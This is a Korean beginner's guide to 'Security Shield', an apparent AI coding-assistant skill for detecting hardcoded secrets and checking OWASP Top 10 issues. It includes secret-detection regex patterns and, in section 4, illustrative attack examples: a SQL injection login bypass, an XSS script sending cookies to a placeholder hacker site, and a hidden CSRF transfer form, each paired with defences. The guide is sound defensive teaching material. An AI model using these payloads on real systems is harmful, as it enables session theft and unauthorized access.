# Security Shield - 비개발자를 위한 완전 가이드

> **문서 버전**: 1.0.0
> **대상 독자**: 비개발자, 스킬 구조를 이해하고 싶은 사람
> **목표**: 보안 스킬이 왜 필요한지, 어떻게 작동하는지 완전히 이해하기

---

## 1. 왜 Security Shield가 필요한가?

### 비유로 이해하기: "건물의 경비 시스템"

**일반 개발자 = 집을 짓는 건축가**
집을 예쁘고 편리하게 만드는 데 집중합니다.

**Security Shield = 보안 전문가**
- "이 창문은 쉽게 깨질 수 있어요" (취약점 탐지)
- "현관 비밀번호가 1234예요?" (약한 인증 경고)
- "열쇠를 우편함 아래 숨기셨군요" (하드코딩 시크릿 탐지)
- "방화문이 필요해요" (보안 레이어 추가)

### 실제 사례: 보안 사고의 비용

```
[ 보안 사고 시나리오 ]

1. 개발자가 실수로 API 키를 코드에 직접 작성
2. GitHub에 코드 업로드
3. 해커가 자동화 도구로 GitHub에서 API 키 수집
4. 해커가 회사 서버에 무단 접근
5. 고객 데이터 10만 건 유출

결과:
- 벌금: 수십억 원
- 이미지 손상: 측정 불가
- 수습 비용: 수억 원
- 고객 신뢰 상실: 회복 불가
```

**Security Shield는 이런 사고를 "코드 작성 단계"에서 막아줍니다.**

---

## 2. 스킬의 핵심 역할

### 2.1 하드코딩 시크릿 탐지 (40+ 패턴)

**시크릿이란?**
비밀번호, API 키, 토큰 등 외부에 노출되면 안 되는 정보

**왜 하드코딩이 위험한가?**
```javascript
// ❌ 위험: 코드에 직접 작성 (하드코딩)
const apiKey = "sk-abc123xyz789";

// ✅ 안전: 환경변수에서 가져오기
const apiKey = process.env.API_KEY;
```

**탐지 패턴 예시:**
```yaml
탐지하는_패턴_종류:
  AWS:
    - "AKIA[0-9A-Z]{16}"              # AWS Access Key
    - "aws.secret_access_key"         # AWS Secret 설정

  Google:
    - "AIza[0-9A-Za-z-_]{35}"         # Google API Key
    - ".gcp.credentials"              # GCP 인증 파일

  Database:
    - "password=", "pwd="             # 비밀번호 직접 작성
    - "mongodb+srv://user:pass@"      # MongoDB 연결 문자열

  API_Keys:
    - "sk-[a-zA-Z0-9]{48}"            # OpenAI API Key
    - "ghp_[a-zA-Z0-9]{36}"           # GitHub Personal Token

  Private_Keys:
    - "-----BEGIN RSA PRIVATE KEY-----"  # RSA 개인키
    - "-----BEGIN OPENSSH PRIVATE KEY-----"  # SSH 키
```

### 2.2 OWASP Top 10 검증

**OWASP란?**
Open Web Application Security Project - 웹 보안의 세계 표준을 만드는 비영리 재단

**Top 10이란?**
가장 흔하고 위험한 웹 취약점 10가지 목록 (3-4년마다 업데이트)

```yaml
OWASP_Top_10_2021:
  A01_Broken_Access_Control:
    설명: "권한 없는 사용자가 다른 사람 데이터에 접근"
    비유: "다른 사람 집 열쇠로 들어가기"
    예방: "모든 요청에서 권한 확인"

  A02_Cryptographic_Failures:
    설명: "암호화 미흡으로 데이터 노출"
    비유: "일기장을 잠금 없이 두기"
    예방: "민감 데이터 항상 암호화"

  A03_Injection:
    설명: "악성 코드가 시스템 명령으로 실행"
    비유: "ATM에 '모든 돈 인출' 명령 주입"
    예방: "사용자 입력을 절대 신뢰하지 않기"

  A04_Insecure_Design:
    설명: "설계 단계부터 보안 고려 안 함"
    비유: "금고 없는 은행 설계"
    예방: "위협 모델링, 보안 설계 검토"

  A05_Security_Misconfiguration:
    설명: "보안 설정 실수"
    비유: "도어락 설치하고 비밀번호 0000"
    예방: "기본값 사용 금지, 설정 검토"

  A06_Vulnerable_Components:
    설명: "취약한 라이브러리 사용"
    비유: "리콜된 자동차 부품 사용"
    예방: "정기적 업데이트, 취약점 스캔"

  A07_Authentication_Failures:
    설명: "인증 시스템 취약점"
    비유: "무한 비밀번호 시도 허용"
    예방: "강력한 비밀번호 정책, 2FA"

  A08_Software_Data_Integrity:
    설명: "업데이트/배포 무결성 미검증"
    비유: "출처 불명 약 복용"
    예방: "서명 검증, 신뢰할 수 있는 소스"

  A09_Security_Logging_Failures:
    설명: "보안 이벤트 로깅 부족"
    비유: "CCTV 없는 은행"
    예방: "모든 보안 이벤트 기록"

  A10_SSRF:
    설명: "서버가 악성 요청을 대신 실행"
    비유: "비서가 모든 심부름을 검증 없이 수행"
    예방: "외부 요청 URL 화이트리스트"
```

---

## 3. 5가지 핵심 보안 원칙

### 3.1 Defense in Depth (심층 방어)

```
[ 비유: 성의 방어 시스템 ]

외곽 성벽 → 해자 → 내벽 → 감시탑 → 최후의 보루

각 층이 뚫려도 다음 층이 방어!

코드에서:
- 1층: 방화벽
- 2층: 인증 (누구인가?)
- 3층: 인가 (권한 있는가?)
- 4층: 입력 검증
- 5층: 데이터 암호화
```

### 3.2 Least Privilege (최소 권한 원칙)

```
[ 비유: 호텔 열쇠 ]

❌ 나쁜 예: 모든 직원에게 마스터키
✅ 좋은 예: 청소부는 청소할 방만, 매니저만 금고

코드에서:
- 데이터베이스 계정: 읽기 전용 vs 읽기/쓰기 분리
- API 키: 서비스별로 권한 최소화
- 사용자 역할: 필요한 권한만 부여
```

### 3.3 Fail Secure (보안 실패)

```
[ 비유: 정전 시 도어락 ]

❌ Fail Open: 정전 → 문 열림 (침입 가능)
✅ Fail Secure: 정전 → 문 잠김 (불편하지만 안전)

코드에서:
- 인증 서버 장애 시 → 모든 접근 거부
- 권한 확인 실패 시 → 기본값은 "거부"
- 에러 발생 시 → 민감 정보 숨기기
```

### 3.4 Input Validation (입력 검증)

```
[ 비유: 공항 보안 검색 ]

모든 승객 → 금속 탐지기 → X-ray → 수하물 검사

코드에서:
- 모든 사용자 입력 = 잠재적 공격
- 숫자 필드에 문자? → 거부
- 이메일 형식 불량? → 거부
- SQL 특수문자? → 이스케이프
```

### 3.5 Output Encoding (출력 인코딩)

```
[ 비유: 외국어 번역 ]

한국어 "농담" → 영어로 번역 시 의미 유지

코드에서:
- HTML 출력 시 → HTML 인코딩 (<script> → &lt;script&gt;)
- URL 출력 시 → URL 인코딩
- JSON 출력 시 → JSON 이스케이프
- 컨텍스트에 맞는 인코딩 필수!
```

---

## 4. 주요 공격 유형과 방어

### 4.1 SQL Injection

```
[ 공격 시나리오 ]

로그인 화면:
ID: admin'--
PW: anything

서버에서 실행되는 쿼리:
SELECT * FROM users WHERE id='admin'--' AND password='anything'
                              ↑
                        여기서 끊김! 비밀번호 체크 무시!

[ 방어 방법 ]
Parameterized Query 사용:
SELECT * FROM users WHERE id=? AND password=?
→ 사용자 입력이 "값"으로만 처리됨
```

### 4.2 XSS (Cross-Site Scripting)

```
[ 공격 시나리오 ]

게시판에 글 작성:
제목: "안녕하세요"
내용: <script>document.location='해커사이트?cookie='+document.cookie</script>

다른 사용자가 글을 열람하면:
→ 스크립트 실행 → 쿠키 탈취 → 세션 도용

[ 방어 방법 ]
- 출력 시 HTML 인코딩
- Content-Security-Policy 헤더 설정
- HttpOnly 쿠키 사용
```

### 4.3 CSRF (Cross-Site Request Forgery)

```
[ 공격 시나리오 ]

1. 피해자가 은행 사이트에 로그인 상태
2. 해커가 만든 사이트 방문
3. 해커 사이트에 숨겨진 폼:
   <form action="은행/송금" method="POST">
     <input name="to" value="해커계좌">
     <input name="amount" value="1000000">
   </form>
4. 자동 제출 → 피해자 이름으로 송금!

[ 방어 방법 ]
- CSRF 토큰 사용
- SameSite 쿠키 속성
- Referer 검증
```

---

## 5. 스킬 작동 방식

### 5.1 자동 발동 조건

```yaml
파일_패턴:
  - ".env, .env.local, .env.production"   # 환경변수 파일
  - "**/auth/**, **/security/**"          # 인증/보안 폴더
  - "*.config.ts, *.config.js"            # 설정 파일
  - "**/middleware/**, **/guard/**"       # 미들웨어/가드

한국어_키워드:
  - "보안, 시큐리티, 취약점"
  - "인증, 인가, 로그인"
  - "비밀번호, 암호화"
  - "토큰, JWT, 세션"

영어_키워드:
  - "security, auth, authentication"
  - "password, encrypt, hash"
  - "token, JWT, session"
```

### 5.2 선택적 문서 로드

```
[ 왜 선택적으로 로드하는가? ]

전체 문서 = 매우 큼 (수천 줄)
항상 전부 로드 = 느리고 비효율적

→ 해결: 상황에 맞는 문서만 로드!

[ 로드 순서 ]

1단계: 언어/프레임워크 감지
  - 파일 확장자 (.ts, .py, .go)
  - import 문 분석
  - package.json 확인

2단계: 항상 로드 (공통)
  - core/secrets-detection.md (시크릿 탐지)
  - quick-reference/checklist.md (체크리스트)

3단계: 언어별 로드
  - TypeScript → languages/typescript-security.md
  - Python → languages/python-security.md
  - Go → languages/go-security.md

4단계: 상황별 로드
  - JWT 작업 → patterns/jwt-security.md
  - OAuth 작업 → patterns/oauth-security.md
  - API 보안 → patterns/api-security.md
```

---

## 6. 보안 체크리스트

### 6.1 시크릿 관리

```markdown
[ 필수 확인 사항 ]

□ 코드에 API 키, 비밀번호, 토큰 없음?
  - 없어야 정상
  - 있으면 즉시 환경변수로 이동

□ 환경변수 또는 Secret Manager 사용?
  - 로컬: .env 파일
  - 프로덕션: Vault, AWS Secrets Manager

□ .env 파일이 .gitignore에 있음?
  - 없으면 GitHub에 비밀번호 노출!

□ 시크릿 로테이션 정책?
  - 정기적 교체 (90일마다 등)
  - 노출 시 즉시 교체
```

### 6.2 입력 검증

```markdown
□ 모든 사용자 입력에 검증 있음?
  - 프론트엔드 검증 (UX용)
  - 백엔드 검증 (보안용, 필수!)

□ DTO에 검증 데코레이터?
  - @IsEmail(), @IsString()
  - @MinLength(), @MaxLength()
  - @IsEnum(), @IsUUID()

□ SQL은 Parameterized Query 사용?
  - ❌ `SELECT * FROM users WHERE id='${id}'`
  - ✅ `SELECT * FROM users WHERE id=$1`
```

### 6.3 인증/인가

```markdown
□ 모든 보호 엔드포인트에 Guard 적용?
  - Public 제외 모든 API에 인증 필요

□ 역할 기반 접근 제어(RBAC) 구현?
  - Admin, User, Guest 등 역할 분리
  - 역할별 권한 명확히 정의

□ 비밀번호는 bcrypt/argon2로 해시?
  - ❌ 평문 저장
  - ❌ MD5, SHA1 (취약)
  - ✅ bcrypt (cost 12+)
  - ✅ argon2id (최신, 권장)
```

---

## 7. 파일 구조

```
security-shield/
├── SKILL.md                      # 메인 파일 (라우터)
├── GUIDE_FOR_BEGINNERS.md        # 이 문서
│
├── core/                         # 핵심 문서
│   ├── secrets-detection.md      # 40+ 시크릿 탐지 패턴
│   └── owasp-advanced.md         # OWASP 고급 패턴
│
├── languages/                    # 언어별 보안
│   ├── typescript-security.md    # Node.js, Express, NestJS
│   ├── python-security.md        # Django, FastAPI, Flask
│   ├── go-security.md            # Go 보안 패턴
│   └── java-security.md          # Spring Security
│
├── templates/                    # 코드 템플릿
│   ├── nestjs-auth.md            # NestJS 인증 템플릿
│   └── react-security.md         # React 보안 템플릿
│
├── patterns/                     # 보안 패턴
│   ├── jwt-security.md           # JWT 보안 패턴
│   └── validation.md             # 입력 검증 패턴
│
└── quick-reference/              # 빠른 참조
    └── checklist.md              # 보안 체크리스트
```

---

## 8. 다른 스킬과의 관계

```
[ Security Shield의 위치 ]

                    ┌──────────────────┐
                    │ vibe-coding-     │ ← 전체 조율
                    │ orchestrator     │
                    └────────┬─────────┘
                             │
    ┌────────────────────────┼────────────────────────┐
    │                        │                        │
    ▼                        ▼                        ▼
┌───────────┐        ┌───────────────┐        ┌─────────────┐
│ clean-    │        │ SECURITY      │        │ tdd-        │
│ code-     │ ←───── │ SHIELD        │ ─────→ │ guardian    │
│ mastery   │        │ (보안 중심)   │        │             │
└───────────┘        └───────────────┘        └─────────────┘
     ↑                       │                       │
     │                       ▼                       │
     │               ┌───────────────┐               │
     └───────────────│ code-reviewer │───────────────┘
                     │ (통합 점수)   │
                     └───────────────┘

관계:
- clean-code-mastery에서 기본 보안 원칙 참조
- tdd-guardian과 보안 테스트 연동
- code-reviewer가 보안 점수 통합
```

---

## 9. 구조적 허점 및 개선점

### 9.1 현재 허점

```yaml
허점_1_언어_커버리지_불균형:
  문제: "TypeScript에 집중, 다른 언어 문서 부족"
  증거: "languages/ 폴더에 4개 파일만 언급"
  영향: "Python, Go 프로젝트에서 지침 부족"
  개선안: "언어별 상세 보안 문서 추가"

허점_2_실시간_취약점_업데이트:
  문제: "OWASP Top 10은 3-4년마다 업데이트, 스킬은 정적"
  증거: "2021 버전 기준, 새 취약점 반영 안 됨"
  영향: "새로운 공격 패턴 탐지 불가"
  개선안: "CVE 데이터베이스 연동, 정기 업데이트"

허점_3_프레임워크_버전_차이:
  문제: "NestJS 8 vs 9, React 17 vs 18 보안 패턴 다름"
  증거: "버전별 분기 없음"
  영향: "구버전 프로젝트에 신버전 패턴 적용"
  개선안: "버전 감지 및 버전별 문서 분기"

허점_4_자동_수정_기능_부재:
  문제: "취약점 탐지만, 자동 수정 없음"
  증거: "allowed-tools에 Write/Edit 없음"
  영향: "탐지 후 개발자가 직접 수정해야 함"
  개선안: "Write 도구 추가, 안전한 자동 수정 구현"
```

### 9.2 개선 제안

```yaml
제안_1_보안_점수_시스템:
  현재: "체크리스트 방식 (Pass/Fail)"
  제안: "수치화된 보안 점수 (0-100)"
  장점: "진행 상황 추적, 목표 설정 가능"

제안_2_위협_모델링_템플릿:
  현재: "일반적인 OWASP 검사"
  제안: "프로젝트별 위협 모델링 가이드"
  장점: "비즈니스 맞춤형 보안 평가"

제안_3_CI_CD_통합_가이드:
  현재: "수동 보안 검사"
  제안: "자동화된 보안 파이프라인 템플릿"
  장점: "매 커밋마다 보안 검증"

제안_4_침투_테스트_시나리오:
  현재: "방어 관점만"
  제안: "공격자 관점 테스트 가이드"
  장점: "실제 공격 시뮬레이션으로 취약점 발견"
```

---

## 10. 핵심 용어 사전

| 용어 | 설명 | 비유 |
|------|------|------|
| **인증 (Authentication)** | 누구인지 확인 | 신분증 확인 |
| **인가 (Authorization)** | 권한 확인 | 입장권 확인 |
| **해시 (Hash)** | 단방향 암호화 | 믹서기 (원래대로 못 돌림) |
| **암호화 (Encryption)** | 양방향 암호화 | 자물쇠 (열쇠로 열 수 있음) |
| **토큰 (Token)** | 인증 증표 | 놀이공원 손목밴드 |
| **세션 (Session)** | 서버 측 상태 저장 | 호텔 체크인 기록 |
| **쿠키 (Cookie)** | 브라우저 저장 데이터 | 도장 |
| **시크릿 (Secret)** | 비밀 정보 | 금고 비밀번호 |
| **취약점 (Vulnerability)** | 보안 약점 | 집의 약한 창문 |
| **익스플로잇 (Exploit)** | 취약점 공격 | 창문 깨고 침입 |

---

## 11. 요약

```
┌────────────────────────────────────────────────────────────┐
│               Security Shield 핵심 요약                      │
├────────────────────────────────────────────────────────────┤
│                                                            │
│  🎯 목적: 코드 작성 단계에서 보안 취약점 예방               │
│                                                            │
│  🔍 주요 기능:                                              │
│     1. 하드코딩 시크릿 탐지 (40+ 패턴)                      │
│     2. OWASP Top 10 검증                                   │
│     3. 언어별 보안 패턴 적용                                │
│     4. 보안 체크리스트 제공                                 │
│                                                            │
│  ⚡ 5대 원칙:                                               │
│     1. Defense in Depth (심층 방어)                        │
│     2. Least Privilege (최소 권한)                         │
│     3. Fail Secure (보안 실패)                             │
│     4. Input Validation (입력 검증)                        │
│     5. Output Encoding (출력 인코딩)                       │
│                                                            │
│  🔗 연관 스킬: clean-code-mastery, code-reviewer           │
│                                                            │
│  ⚠️ 허점: 언어 커버리지 불균형, 실시간 업데이트 부재       │
│                                                            │
└────────────────────────────────────────────────────────────┘
```

---

**문서 작성일**: 2025-12-10
**다음 업데이트 예정**: 언어별 상세 문서 추가 시
